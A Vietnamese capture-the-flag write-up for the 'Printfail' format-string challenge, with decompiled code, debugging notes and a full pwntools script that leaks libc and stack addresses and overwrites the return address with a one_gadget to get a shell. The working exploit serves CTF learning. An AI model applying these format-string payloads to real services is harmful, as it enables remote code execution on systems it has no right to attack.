# Printfail

đây là 1 trong những chall khó nhất mình từng gặp


**ida:**

```c 

int __fastcall run_round(_DWORD *a1)
{
  memset(buf, 0, sizeof(buf));
  fflush(stdout);
  if ( !fgets(buf, 512, stdin) )
    return 0;
  *a1 = strlen(buf) <= 1;
  return printf(buf);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("I'll let you make one printf call. You control the format string. No do-overs.");
  v4 = 1;
  while ( v4 )
  {
    if ( !(unsigned int)run_round(&v4) )
      return 0;
    if ( v4 )
      puts("...That was an empty string. Come on, you've at least gotta try!\nOkay, I'll give you another chance.");
  }
  return 0;
}

```

**chà bài này chỉ có lỗi fmt thôi**

checks:

![image](https://github.com/gookoosss/CTF/assets/128712571/dac8d3ae-4355-4c9d-8363-48fed8c7e710)


má fulltank luôn chứ :)) 

![image](https://github.com/gookoosss/CTF/assets/128712571/78d92cf8-1fb2-4cb6-a2cf-9a0f41a897a5)


ở đây dữ liệu nhập vào được đặt ở địa chỉ heap, đồng nghĩa với việc ta ko thể thay đổi stack được, **bài này tương đối khó nên ta chỉ có cách làm duy nhất sự dụng fmt nhiều lần nhằm thay đổi rip trỏ đến thứ ta muốn**

## Phân tích
- trong ida ko có system hay shell nên ta chỉ có thể leak libc ra để tự tạo shell cho mình => **leak libc**
- để ý trên ảnh thì stack **0x007fffffffe0c0** đang chứa **0x007fffffffe208** trỏ đến **0x007fffffffe47b**, nếu vậy ta hoàn toàn có thể lợi dụng lỗi fmt để dễ dàng đổi **0x007fffffffe47b** thành rip của main để khai thác
- tiếp tục lợi dụng lỗi fmt lần nữa để thay đổi giá trị trỏ đến của rip thành **one_gadget** là ta có thể lấy được shell

## Lưu ý
**nếu ta làm như bình thường thì ta nhận ra 1 điều là tại sao khi ta chạy script thì nó luôn dừng chương trình mặc dù trong ida thì nó là lặp vô tận**

h ta sẽ debug xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/35b43127-702a-43e7-ad82-3721a25609f4)


đây đây tại đây thì ta thấy **rax sẽ so sánh với 0x1**, nếu rax khác 0x1 thì sẽ dừng chương trình ngay lập tức và ko khai thác được gì


![image](https://github.com/gookoosss/CTF/assets/128712571/f0a7542f-7b6d-45a2-8139-193ccb79f6e7)


tại đây thì ta thấy thì ta thấy **địa chỉ rax là 0x007fffffffe0e4**, nếu vậy thì ta chỉ cần **gán 1 byte duy nhất vào rax trong mỗi lần nhập** thì ta có thể thoải mái lặp được rồi 

để ý thì **0x007fffffffe0e4** có nhằm trên stack nên ta có thể sử dụng **%c và %n** trong mỗi lần nhập rồi

## script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./printfail_patched")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
ld = ELF("./ld-2.31.so")
# p = process([exe.path])
p = remote('0.tcp.ap.ngrok.io', 11707)

context.binary = exe

# gdb.attach(p, gdbscript = '''
# b*run_round+75
# b*run_round+132
# c 
# ''')

# input()

#########################
### Stage1: leak libc ###
#########################

payload = b'%1c%7$n%13$p|'
p.sendline(payload)
p.recvline()
p.recvuntil(b'1')
libc_leak = int(p.recvuntil(b'|',drop=True),16)
libc.address = libc_leak - 0x24083
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

##########################
### Stage1:leak stack  ###
##########################

payload = b'%1c%7$n%15$p|'
p.sendline(payload)
p.recvline()
p.recvuntil(b'1')
stack_leak = int(p.recvuntil(b'|',drop=True),16)
rip = stack_leak - 0xf0
log.info("stack leak: " + hex(stack_leak))
log.info("rip: " + hex(rip))

#########################
### Stage1: tạo shell ###
#########################

one_gadget = libc.address + 0xe3b01
log.info("one_gadget: " + hex(one_gadget))

for i in range(0, 2):
    rip += 2*i
    payload = f'%1c%7$n%{(rip & 0xffff) - 1}c%15$hn'.encode()
    p.sendline(payload)
    payload = f'%1c%7$n%{(one_gadget & 0xffff) - 1}c%43$hn'.encode()
    p.sendline(payload)
    one_gadget = one_gadget >> 16
    log.info("one_gadget: " + hex(one_gadget))

p.sendline(b'a')

p.interactive()




```
